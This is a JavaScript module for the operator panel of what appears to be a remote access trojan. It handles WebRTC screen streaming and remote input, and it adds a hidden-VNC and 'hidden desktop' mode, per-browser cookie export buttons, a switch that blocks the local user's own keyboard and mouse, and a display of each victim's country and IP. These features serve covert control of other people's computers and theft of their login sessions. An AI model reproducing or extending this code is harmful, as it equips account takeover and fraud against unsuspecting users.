(() => {
  "use strict";

  const remdesk = window.remdesk || (window.remdesk = {});

  const CONTROL_ACTION = "control";
  const CONTROL_TYPES = {
    mouseMove: "mouse_move",
    mouseClick: "mouse_click",
    mouseDown: "mouse_down",
    mouseUp: "mouse_up",
    mouseScroll: "mouse_scroll",
    keypress: "keypress",
    keyDown: "key_down",
    keyUp: "key_up",
    text: "text"
  };
  const E2EE_STORAGE_KEY = "rc_e2ee_passphrase";
  const PANEL_COLLAPSED_KEY = "rc_panel_collapsed";
  const E2EE_PBKDF2_ITERS = 150000;
  const E2EE_SALT_PREFIX = "remote-controller:";
  const CONTROL_MOVE_INTERVAL_MS = 33;
  const STORAGE_TIMEOUT_MS = 10000;
  const STREAM_HINT_DEBOUNCE_MS = 250;
  const STREAM_HINT_THRESHOLD = 40;
  const NETWORK_STATS_INTERVAL_MS = 2000;
  const NETWORK_ADAPT_COOLDOWN_MS = 4000;
  const NETWORK_BPP = 0.1;
  const LOSS_DEGRADE = 0.12;
  const LOSS_UPGRADE = 0.01;
  const RTT_DEGRADE = 450;
  const RTT_UPGRADE = 180;
  const PROFILE_HEIGHT_DOWN_SCALE = 0.92;
  const PROFILE_HEIGHT_UP_SCALE = 1.15;
  const SCREEN_LAYOUT_DEBOUNCE_MS = 120;
  const ASPECT_CHANGE_THRESHOLD = 0.02;
  const ASPECT_CHANGE_SOFT_THRESHOLD = 0.006;
  const ASPECT_UPDATE_COOLDOWN_MS = 1200;
  const SIGNALING_PING_INTERVAL_MS = 20000;
  const RECONNECT_BASE_DELAY_MS = 2000;
  const RECONNECT_MAX_DELAY_MS = 20000;
  const RECONNECT_JITTER_MS = 1000;
  const CONNECTION_READY_TIMEOUT_MS = 20000;
  const CONNECTION_DROP_GRACE_MS = 8000;
  const DEFAULT_ICE_SERVERS = [
    { urls: ["stun:stun.l.google.com:19302"] },
    { urls: ["stun:stun1.l.google.com:19302"] },
    { urls: ["stun:stun.cloudflare.com:3478"] }
  ];

  const STREAM_PROFILES = {
    speed: { minHeight: 720, maxHeight: 1080, minFps: 40, maxFps: 60 },
    balanced: { minHeight: 900, maxHeight: 1440, minFps: 30, maxFps: 60 },
    quality: { minHeight: 1080, maxHeight: 2160, minFps: 30, maxFps: 60 },
    reading: { minHeight: 1440, maxHeight: 2160, minFps: 10, maxFps: 15 }
  };

  remdesk.constants = {
    CONTROL_ACTION,
    CONTROL_TYPES,
    E2EE_STORAGE_KEY,
    PANEL_COLLAPSED_KEY,
    E2EE_PBKDF2_ITERS,
    E2EE_SALT_PREFIX,
    CONTROL_MOVE_INTERVAL_MS,
    STORAGE_TIMEOUT_MS,
    STREAM_HINT_DEBOUNCE_MS,
    STREAM_HINT_THRESHOLD,
    NETWORK_STATS_INTERVAL_MS,
    NETWORK_ADAPT_COOLDOWN_MS,
    NETWORK_BPP,
    LOSS_DEGRADE,
    LOSS_UPGRADE,
    RTT_DEGRADE,
    RTT_UPGRADE,
    PROFILE_HEIGHT_DOWN_SCALE,
    PROFILE_HEIGHT_UP_SCALE,
    SCREEN_LAYOUT_DEBOUNCE_MS,
    ASPECT_CHANGE_THRESHOLD,
    ASPECT_CHANGE_SOFT_THRESHOLD,
    ASPECT_UPDATE_COOLDOWN_MS,
    SIGNALING_PING_INTERVAL_MS,
    RECONNECT_BASE_DELAY_MS,
    RECONNECT_MAX_DELAY_MS,
    RECONNECT_JITTER_MS,
    CONNECTION_READY_TIMEOUT_MS,
    CONNECTION_DROP_GRACE_MS,
    DEFAULT_ICE_SERVERS,
    STREAM_PROFILES
  };

  const textEncoder = typeof TextEncoder !== "undefined" ? new TextEncoder() : null;
  const textDecoder = typeof TextDecoder !== "undefined" ? new TextDecoder() : null;

  function utf8Encode(value) {
    if (textEncoder) {
      return textEncoder.encode(value);
    }
    const encoded = unescape(encodeURIComponent(value));
    const bytes = new Uint8Array(encoded.length);
    for (let i = 0; i < encoded.length; i += 1) {
      bytes[i] = encoded.charCodeAt(i);
    }
    return bytes;
  }

  function utf8Decode(value) {
    if (textDecoder) {
      return textDecoder.decode(value);
    }
    let bytes = null;
    if (value instanceof ArrayBuffer) {
      bytes = new Uint8Array(value);
    } else if (ArrayBuffer.isView(value)) {
      bytes = new Uint8Array(value.buffer, value.byteOffset, value.byteLength);
    } else if (typeof value === "string") {
      return value;
    } else if (value === null || value === undefined) {
      return "";
    } else {
      return String(value);
    }
    let binary = "";
    for (let i = 0; i < bytes.length; i += 1) {
      binary += String.fromCharCode(bytes[i]);
    }
    try {
      return decodeURIComponent(escape(binary));
    } catch (error) {
      return binary;
    }
  }

  remdesk.utf8Encode = utf8Encode;
  remdesk.utf8Decode = utf8Decode;

  const state = {
    operatorId:
      typeof crypto !== "undefined" && crypto.randomUUID
        ? crypto.randomUUID()
        : `operator-${Date.now()}-${Math.random().toString(16).slice(2)}`,
    peerConnection: null,
    controlChannel: null,
    signalingWebSocket: null,
    connecting: false,
    storageAutostart: false,
    rtcConfig: { iceServers: [] },
    controlEnabled: true,
    modeLocked: false,
    controlsBound: false,
    remoteCurrentPath: ".",
    pendingDownload: null,
    pendingAppLaunch: null,
    pendingExport: null,
    pendingProxyControl: null,
    pendingExportRetries: 0,
    availableBrowsers: null,
    isConnected: false,
    e2eeContext: null,
    cursorX: 0,
    cursorY: 0,
    cursorLocked: false,
    softLock: false,
    cursorInitialized: false,
    cursorBounds: { width: 0, height: 0 },
    lastMoveSentAt: 0,
    movePumpId: null,
    cursorDirty: false,
    lastLocalX: null,
    lastLocalY: null,
    lastSentPosition: null,
    mouseButtonsDown: new Set(),
    pressedKeys: new Set(),
    regionLabel: "",
    countryLabel: "",
    countryCode: "",
    flagCodes: [],
    storageTimer: null,
    streamProfile: "quality",
    streamHintTimer: null,
    lastStreamHint: null,
    statsTimer: null,
    netStats: null,
    netTargetHeight: null,
    netTargetFps: null,
    netLastAdaptAt: 0,
    networkHint: { height: null, fps: null },
    iceServersPreset: null,
    iceServersPresetSet: false,
    iceErrorCount: 0,
    iceFallbackTried: false,
    allowIceFallback: false,
    pendingIce: [],
    signalingPingTimer: null,
    reconnectTimer: null,
    reconnectAttempt: 0,
    connectReadyTimer: null,
    hadConnection: false,
    connectionDropTimer: null,
    panelCollapsed: false,
    textInputSupported: true,
    screenAspect: null,
    lastAspectUpdateAt: 0,
    storageOnly: false,
    remoteCursorVisible: true,
    lastRenderSize: null,
    lastFrameBounds: null,
    metricsCache: null,
    layoutTimer: null,
    sessionMode: "manage",
    // Dual-stream HVNC state
    dualStreamActive: false,
    dualStreamMode: "main",  // "main", "hvnc", "split", "pip"
    mainVideoTrack: null,
    hvncVideoTrack: null
  };

  const dom = {
    statusEl: document.getElementById("status"),
    serverUrlInput: document.getElementById("serverUrl"),
    sessionIdInput: document.getElementById("sessionId"),
    authTokenInput: document.getElementById("authToken"),
    e2eeKeyInput: document.getElementById("e2eeKey"),
    interactionToggle: document.getElementById("interactionToggle"),
    interactionState: document.getElementById("interactionState"),
    modeBadge: document.getElementById("modeBadge"),
    sessionModeButtons: Array.from(document.querySelectorAll("[data-mode]")),
    storageToggle: document.getElementById("storageToggle"),
    storageClose: document.getElementById("storageClose"),
    storageDrawer: document.getElementById("storageDrawer"),
    appStatus: document.getElementById("appStatus"),
    appButtons: Array.from(document.querySelectorAll("[data-app]")),
    cookieStatus: document.getElementById("cookieStatus"),
    cookieButtons: Array.from(document.querySelectorAll("[data-cookie]")),
    remotePathInput: document.getElementById("remotePathInput"),
    remoteFileList: document.getElementById("remoteFileList"),
    remoteStatus: document.getElementById("remoteStatus"),
    downloadStatus: document.getElementById("downloadStatus"),
    downloadList: document.getElementById("downloadList"),
    screenFrame: document.getElementById("screenFrame"),
    screenEl: document.getElementById("screen"),
    panelToggle: document.getElementById("panelToggle"),
    fullscreenToggle: document.getElementById("fullscreenToggle"),
    connectButton: document.getElementById("connectButton"),
    cursorVisibilityToggle: document.getElementById("cursorVisibilityToggle"),
    cursorVisibilityHint: document.getElementById("cursorVisibilityHint"),
    remoteGo: document.getElementById("remoteGo"),
    remoteUp: document.getElementById("remoteUp"),
    remoteRefresh: document.getElementById("remoteRefresh"),
    manageOnly: Array.from(document.querySelectorAll("[data-requires-manage]")),
    streamProfile: document.getElementById("streamProfile"),
    cursorOverlay: null,
    topSessionId: document.getElementById("topSessionId"),
    topCountry: document.getElementById("topCountry"),
    topCountryFlag: document.getElementById("topCountryFlag"),
    topRegion: document.getElementById("topRegion"),
    topIp: document.getElementById("topIp"),
    topTime: document.getElementById("topTime"),
    topFlags: document.getElementById("topFlags"),
    // Hidden Desktop Controls
    hiddenDesktopControls: document.getElementById("hiddenDesktopControls"),
    inputBlockingToggle: document.getElementById("inputBlockingToggle"),
    inputBlockingStatus: document.getElementById("inputBlockingStatus"),
    // Dual-stream HVNC elements
    hvncScreenEl: document.getElementById("hvncScreen"),
    dualStreamControls: document.getElementById("dualStreamControls"),
    dualStreamToggle: document.getElementById("dualStreamToggle"),
    dualStreamLabel: document.getElementById("dualStreamLabel"),
    mainIndicator: document.getElementById("mainIndicator"),
    hvncIndicator: document.getElementById("hvncIndicator")
  };

  const KEY_MAP = {
    Enter: "enter",
    Backspace: "backspace",
    Tab: "tab",
    Escape: "esc",
    " ": "space",
    ArrowLeft: "left",
    ArrowRight: "right",
    ArrowUp: "up",
    ArrowDown: "down",
    Delete: "delete",
    Home: "home",
    End: "end",
    PageUp: "pageup",
    PageDown: "pagedown",
    Insert: "insert"
  };

  remdesk.state = state;
  remdesk.dom = dom;
  remdesk.KEY_MAP = KEY_MAP;

  function normalizeSessionMode(mode) {
    const value = String(mode || "").trim().toLowerCase();
    if (value === "view" || value === "viewer" || value === "readonly") {
      return "view";
    }
    if (value === "hidden" || value === "hidden-manage" || value === "hidden_manage") {
      return "hidden";
    }
    if (value === "hvnc" || value === "hiddenvnc" || value === "createdesktop") {
      return "hvnc";
    }
    return "manage";
  }

  function normalizeTopValue(value) {
    const trimmed = (value || "").trim();
    return trimmed || "--";
  }

  function extractHost(value) {
    const raw = (value || "").trim();
    if (!raw) {
      return "--";
    }
    try {
      const url = raw.includes("://") ? new URL(raw) : new URL(`http://${raw}`);
      return url.hostname || raw;
    } catch (error) {
      return raw;
    }
  }

  function updateTopBar() {
    if (dom.topSessionId) {
      dom.topSessionId.textContent = normalizeTopValue(dom.sessionIdInput.value);
    }
    if (dom.topRegion) {
      dom.topRegion.textContent = normalizeTopValue(state.regionLabel);
    }
    if (dom.topIp) {
      dom.topIp.textContent = extractHost(dom.serverUrlInput.value);
    }
    if (dom.topCountry) {
      const countryLabel = state.countryLabel || state.regionLabel;
      dom.topCountry.textContent = normalizeTopValue(countryLabel);
    }
    if (dom.topCountryFlag) {
      const code = state.countryCode || (state.flagCodes[0] || "");
      dom.topCountryFlag.textContent = code ? countryCodeToFlag(code) : "--";
    }
    renderFlags();
  }

  function formatTopTime(date) {
    return date.toLocaleString(undefined, {
      year: "numeric",
      month: "2-digit",
      day: "2-digit",
      hour: "2-digit",
      minute: "2-digit"
    });
  }

  function startTopClock() {
    if (!dom.topTime) {
      return;
    }
    const update = () => {
      dom.topTime.textContent = formatTopTime(new Date());
    };
    update();
    setInterval(update, 60000);
  }

  function parseFlagList(value) {
    if (!value) {
      return [];
    }
    if (Array.isArray(value)) {
      return value.map((item) => String(item)).filter((item) => item.trim());
    }
    return String(value)
      .split(/[,; ]+/)
      .map((item) => item.trim())
      .filter(Boolean);
  }

  function countryCodeToFlag(code) {
    const normalized = String(code || "").trim().toUpperCase();
    if (normalized.length !== 2) {
      return normalized || "--";
    }
    const base = 0x1f1e6;
    const first = normalized.charCodeAt(0) - 65;
    const second = normalized.charCodeAt(1) - 65;
    if (first < 0 || first > 25 || second < 0 || second > 25) {
      return normalized;
    }
    return String.fromCodePoint(base + first, base + second);
  }

  function renderFlags() {
    if (!dom.topFlags) {
      return;
    }
    dom.topFlags.replaceChildren();
    const codes = Array.isArray(state.flagCodes) ? state.flagCodes : [];
    const visible = codes.slice(0, 8);
    if (!visible.length) {
      dom.topFlags.textContent = "--";
      return;
    }
    visible.forEach((code) => {
      const item = document.createElement("span");
      item.className = "flag-item";
      item.textContent = countryCodeToFlag(code);
      item.title = String(code || "").toUpperCase();
      dom.topFlags.appendChild(item);
    });
  }

  function setStatus(message, stateKey = "") {
    dom.statusEl.textContent = message;
    dom.statusEl.dataset.state = stateKey;
  }

  function reportScriptError(message) {
    if (dom.statusEl) {
      setStatus(message, "bad");
    }
    console.error(message);
  }

  window.addEventListener("error", (event) => {
    if (!event) {
      return;
    }
    const message = event.message || "Unexpected script error";
    reportScriptError(`Script error: ${message}`);
  });

  window.addEventListener("unhandledrejection", (event) => {
    if (!event) {
      return;
    }
    const reason = event.reason && event.reason.message ? event.reason.message : event.reason;
    reportScriptError(`Script error: ${reason || "Unhandled rejection"}`);
  });

  function setRemoteStatus(message, stateKey = "") {
    dom.remoteStatus.textContent = message;
    dom.remoteStatus.dataset.state = stateKey;
  }

  function clearStorageTimeout() {
    if (state.storageTimer) {
      clearTimeout(state.storageTimer);
      state.storageTimer = null;
    }
  }

  function setDownloadStatus(message, stateKey = "") {
    dom.downloadStatus.textContent = message;
    dom.downloadStatus.dataset.state = stateKey;
  }

  function setAppStatus(message, stateKey = "") {
    if (!dom.appStatus) {
      return;
    }
    dom.appStatus.textContent = message;
    dom.appStatus.dataset.state = stateKey;
  }

  function setCookieStatus(message, stateKey = "") {
    if (!dom.cookieStatus) {
      return;
    }
    dom.cookieStatus.textContent = message;
    dom.cookieStatus.dataset.state = stateKey;
  }

  function applyAvailableBrowsers(list) {
    if (!Array.isArray(list)) {
      state.availableBrowsers = null;
      dom.appButtons.forEach((button) => {
        button.style.display = "";
      });
      dom.cookieButtons.forEach((button) => {
        button.style.display = "";
      });
      return;
    }
    if (!list.length) {
      state.availableBrowsers = new Set();
      dom.appButtons.forEach((button) => {
        button.style.display = "none";
      });
      dom.cookieButtons.forEach((button) => {
        const key = String(button.dataset.cookie || "").toLowerCase();
        button.style.display = key === "all" ? "" : "none";
      });
      return;
    }
    const allowed = new Set(list.map((item) => String(item).toLowerCase()));
    state.availableBrowsers = allowed;
    dom.appButtons.forEach((button) => {
      const key = String(button.dataset.app || "").toLowerCase();
      button.style.display = allowed.has(key) ? "" : "none";
    });
    dom.cookieButtons.forEach((button) => {
      const key = String(button.dataset.cookie || "").toLowerCase();
      if (key === "all") {
        button.style.display = "";
        return;
      }
      button.style.display = allowed.has(key) ? "" : "none";
    });
  }

  function updateAppLaunchAvailability() {
    const enabled = state.isConnected && state.controlEnabled;
    dom.appButtons.forEach((button) => {
      button.disabled = !enabled;
    });
    if (!enabled) {
      if (!state.isConnected) {
        setAppStatus("Connect to launch apps", "warn");
      } else {
        setAppStatus("Switch to manage mode to launch apps", "warn");
      }
      return;
    }
    setAppStatus("Ready", "ok");
  }

  function updateCookieAvailability() {
    const enabled = state.isConnected && state.controlEnabled;
    dom.cookieButtons.forEach((button) => {
      button.disabled = !enabled;
    });
    if (!enabled) {
      if (!state.isConnected) {
        setCookieStatus("Connect to export cookies", "warn");
      } else {
        setCookieStatus("Switch to manage mode to export cookies", "warn");
      }
      return;
    }
    setCookieStatus("Ready", "ok");
  }

  function setModeLocked(locked) {
    state.modeLocked = Boolean(locked);
    if (dom.interactionToggle) {
      dom.interactionToggle.disabled = state.modeLocked;
      dom.interactionToggle.setAttribute("aria-disabled", state.modeLocked.toString());
    }
    dom.sessionModeButtons.forEach((button) => {
      button.disabled = state.modeLocked;
      button.setAttribute("aria-disabled", state.modeLocked.toString());
    });
    if (dom.modeBadge) {
      if (state.modeLocked) {
        dom.modeBadge.classList.add("locked");
      } else {
        dom.modeBadge.classList.remove("locked");
      }
    }
  }

  function setConnected(connected) {
    state.isConnected = Boolean(connected);
    updateAppLaunchAvailability();
    updateCookieAvailability();
    updateRemoteCursorVisibilityAvailability();
  }

  function syncSessionModeButtons() {
    if (!dom.sessionModeButtons.length) {
      return;
    }
    dom.sessionModeButtons.forEach((button) => {
      const mode = normalizeSessionMode(button.dataset.mode);
      button.classList.toggle("is-active", mode === state.sessionMode);
    });
  }

  function updateInteractionMode() {
    const nextMode =
      state.sessionMode ||
      (dom.interactionToggle && dom.interactionToggle.checked ? "manage" : "view");
    const nextEnabled = nextMode !== "view";
    if (!nextEnabled && state.controlEnabled && remdesk.releasePressedInputs) {
      remdesk.releasePressedInputs();
    }
    state.controlEnabled = nextEnabled;
    state.sessionMode = normalizeSessionMode(nextMode);
    syncSessionModeButtons();
    const hiddenMode = state.sessionMode === "hidden";
    const hvncMode = state.sessionMode === "hvnc";
    const isHiddenOrHvnc = hiddenMode || hvncMode;
    const label = hvncMode ? "HVNC managing" : hiddenMode ? "Hidden managing" : state.controlEnabled ? "Managing" : "Viewing";
    if (dom.interactionState) {
      dom.interactionState.textContent = label;
    }
    if (dom.modeBadge) {
      dom.modeBadge.textContent = hvncMode
        ? "HVNC mode"
        : hiddenMode
          ? "Hidden desktop"
          : state.controlEnabled
            ? "Manage mode"
            : "View only";
    }
    document.body.classList.toggle("manage-mode", state.controlEnabled);
    document.body.classList.toggle("view-mode", !state.controlEnabled);
    document.body.classList.toggle("hidden-manage", hiddenMode);
    document.body.classList.toggle("hvnc-mode", hvncMode);
    updateAppLaunchAvailability();
    updateCookieAvailability();
    const disableManage = !state.controlEnabled;
    dom.manageOnly.forEach((section) => {
      section.classList.toggle("disabled", disableManage);
      section
        .querySelectorAll("button, input, select, textarea")
        .forEach((control) => {
          control.disabled = disableManage;
          control.setAttribute("aria-disabled", disableManage.toString());
        });
    });
    if (!state.controlEnabled) {
      if (remdesk.releasePointerLock) {
        remdesk.releasePointerLock();
      }
      if (remdesk.stopMovePump) {
        remdesk.stopMovePump();
      }
      if (remdesk.setSoftLock) {
        remdesk.setSoftLock(false);
      }
    } else {
      if (remdesk.setRemoteCursorVisibility) {
        remdesk.setRemoteCursorVisibility(false, state.isConnected);
      }
    }
    if (remdesk.updateCursorOverlayVisibility) {
      remdesk.updateCursorOverlayVisibility();
    }
    updateRemoteCursorVisibilityAvailability();
    // Update hidden desktop controls visibility
    if (remdesk.updateHiddenDesktopControls) {
      remdesk.updateHiddenDesktopControls();
    }
    
    // Open HVNC window when entering HVNC mode
    if (hvncMode && remdesk.hvnc && remdesk.hvnc.showWindow) {
      remdesk.hvnc.showWindow();
    } else if (!hvncMode && remdesk.hvnc && remdesk.hvnc.hideWindow) {
      remdesk.hvnc.hideWindow();
    }
  }

  function applySessionMode(mode, options = {}) {
    const nextMode = normalizeSessionMode(mode);
    const prevMode = state.sessionMode;
    state.sessionMode = nextMode;
    if (dom.interactionToggle) {
      const shouldCheck = nextMode !== "view";
      if (dom.interactionToggle.checked !== shouldCheck) {
        dom.interactionToggle.checked = shouldCheck;
      }
    }
    updateInteractionMode();
    if (
      options.triggerReconnect &&
      state.isConnected &&
      !state.modeLocked &&
      prevMode !== nextMode
    ) {
      remdesk.setStatus("Switching mode...", "warn");
      void remdesk.connect();
    }
  }

  function updatePanelToggleLabel() {
    if (!dom.panelToggle) {
      return;
    }
    dom.panelToggle.textContent = state.panelCollapsed ? "Show panel" : "Hide panel";
  }

  function updateFullscreenToggleLabel() {
    if (!dom.fullscreenToggle) {
      return;
    }
    dom.fullscreenToggle.textContent =
      document.fullscreenElement === dom.screenFrame ? "Exit full screen" : "Full screen";
  }

  function setPanelCollapsed(collapsed) {
    state.panelCollapsed = Boolean(collapsed);
    document.body.classList.toggle("panel-collapsed", state.panelCollapsed);
    updatePanelToggleLabel();
    sessionStorage.setItem(PANEL_COLLAPSED_KEY, state.panelCollapsed ? "1" : "0");
  }

  function togglePanelCollapsed(force) {
    const shouldCollapse = typeof force === "boolean" ? force : !state.panelCollapsed;
    setPanelCollapsed(shouldCollapse);
    if (remdesk.scheduleScreenLayout) {
      remdesk.scheduleScreenLayout();
    }
  }

  function restorePanelState() {
    const stored = sessionStorage.getItem(PANEL_COLLAPSED_KEY);
    if (!stored) {
      return;
    }
    setPanelCollapsed(stored === "1");
  }

  function toggleFullscreen() {
    if (!dom.screenFrame) {
      return;
    }
    if (document.fullscreenElement === dom.screenFrame) {
      document.exitFullscreen();
      return;
    }
    dom.screenFrame.requestFullscreen().catch(() => {
      setStatus("Fullscreen failed", "bad");
    });
  }

  function updateRemoteCursorVisibilityAvailability() {
    if (!dom.cursorVisibilityToggle) {
      return;
    }
    const enabled = state.isConnected && state.controlEnabled;
    dom.cursorVisibilityToggle.disabled = !enabled;
    dom.cursorVisibilityToggle.setAttribute("aria-disabled", (!enabled).toString());
    if (!dom.cursorVisibilityHint) {
      return;
    }
    if (!enabled) {
      if (!state.isConnected) {
        dom.cursorVisibilityHint.textContent = "Connect to update cursor visibility";
      } else {
        dom.cursorVisibilityHint.textContent = "Switch to manage mode to update cursor visibility";
      }
      return;
    }
    dom.cursorVisibilityHint.textContent = state.remoteCursorVisible
      ? "Remote cursor visible"
      : "Remote cursor hidden";
  }

  // =========================================================================
  // Hidden Desktop: Input Blocking Controls
  // =========================================================================
  
  /**
   * Update the input blocking status display.
   * @param {boolean} isBlocked - Whether input is currently blocked.
   * @param {string} [statusState] - Status state: "on", "off", or "error".
   */
  function setInputBlockingStatus(isBlocked, statusState) {
    if (!dom.inputBlockingStatus) return;
    
    const stateValue = statusState || (isBlocked ? "on" : "off");
    dom.inputBlockingStatus.setAttribute("data-state", stateValue);
    
    if (stateValue === "error") {
      dom.inputBlockingStatus.textContent = "Input blocking: Error (admin required?)";
    } else if (isBlocked) {
      dom.inputBlockingStatus.textContent = "Input blocking: ON (local input disabled)";
    } else {
      dom.inputBlockingStatus.textContent = "Input blocking: OFF";
    }
    
    // Sync toggle state
    if (dom.inputBlockingToggle) {
      dom.inputBlockingToggle.checked = isBlocked;
    }
  }
  
  /**
   * Toggle input blocking on the remote client.
   * Sends a message over the data channel to enable/disable local input.
   * @param {boolean} enabled - Whether to enable input blocking.
   */
  function toggleInputBlocking(enabled) {
    if (!state.controlChannel || state.controlChannel.readyState !== "open") {
      setInputBlockingStatus(false, "error");
      return;
    }
    
    const message = {
      action: "toggle_input_blocking",
      enabled: Boolean(enabled)
    };
    
    try {
      if (remdesk.sendEncrypted) {
        remdesk.sendEncrypted(message);
      } else {
        state.controlChannel.send(JSON.stringify(message));
      }
    } catch (err) {
      console.error("Failed to toggle input blocking:", err);
      setInputBlockingStatus(false, "error");
    }
  }
  
  /**
   * Handle response from the client about input blocking status.
   * @param {Object} payload - Response payload from client.
   */
  function handleInputBlockingResponse(payload) {
    const isBlocked = Boolean(payload.is_blocked);
    const success = payload.success !== false;
    
    if (!success) {
      setInputBlockingStatus(false, "error");
      return;
    }
    
    setInputBlockingStatus(isBlocked);
  }
  
  /**
   * Initialize input blocking toggle event listener.
   */
  function initInputBlockingToggle() {
    if (!dom.inputBlockingToggle) return;
    
    dom.inputBlockingToggle.addEventListener("change", function() {
      toggleInputBlocking(this.checked);
    });
  }
  
  /**
   * Update hidden desktop controls visibility based on session mode.
   */
  function updateHiddenDesktopControls() {
    const isHiddenMode = state.sessionMode === "hidden" || state.sessionMode === "hvnc";
    
    if (dom.hiddenDesktopControls) {
      dom.hiddenDesktopControls.style.display = isHiddenMode ? "block" : "none";
    }
    
    // Reset input blocking toggle when not in hidden mode
    if (!isHiddenMode && dom.inputBlockingToggle) {
      dom.inputBlockingToggle.checked = false;
      setInputBlockingStatus(false);
    }
  }

  remdesk.normalizeTopValue = normalizeTopValue;
  remdesk.extractHost = extractHost;
  remdesk.updateTopBar = updateTopBar;
  remdesk.formatTopTime = formatTopTime;
  remdesk.startTopClock = startTopClock;
  remdesk.parseFlagList = parseFlagList;
  remdesk.countryCodeToFlag = countryCodeToFlag;
  remdesk.renderFlags = renderFlags;
  remdesk.setStatus = setStatus;
  remdesk.reportScriptError = reportScriptError;
  remdesk.setRemoteStatus = setRemoteStatus;
  remdesk.clearStorageTimeout = clearStorageTimeout;
  remdesk.setDownloadStatus = setDownloadStatus;
  remdesk.setAppStatus = setAppStatus;
  remdesk.setCookieStatus = setCookieStatus;
  remdesk.applyAvailableBrowsers = applyAvailableBrowsers;
  remdesk.updateAppLaunchAvailability = updateAppLaunchAvailability;
  remdesk.updateCookieAvailability = updateCookieAvailability;
  remdesk.setModeLocked = setModeLocked;
  remdesk.setConnected = setConnected;
  remdesk.syncInteractionToggle = syncSessionModeButtons;
  remdesk.updateInteractionMode = updateInteractionMode;
  remdesk.applySessionMode = applySessionMode;
  remdesk.normalizeSessionMode = normalizeSessionMode;
  remdesk.updatePanelToggleLabel = updatePanelToggleLabel;
  remdesk.updateFullscreenToggleLabel = updateFullscreenToggleLabel;
  remdesk.setPanelCollapsed = setPanelCollapsed;
  remdesk.togglePanelCollapsed = togglePanelCollapsed;
  remdesk.restorePanelState = restorePanelState;
  remdesk.toggleFullscreen = toggleFullscreen;
  remdesk.updateRemoteCursorVisibilityAvailability = updateRemoteCursorVisibilityAvailability;
  // Hidden Desktop Controls
  remdesk.setInputBlockingStatus = setInputBlockingStatus;
  remdesk.toggleInputBlocking = toggleInputBlocking;
  remdesk.handleInputBlockingResponse = handleInputBlockingResponse;
  remdesk.initInputBlockingToggle = initInputBlockingToggle;
  remdesk.updateHiddenDesktopControls = updateHiddenDesktopControls;
})();
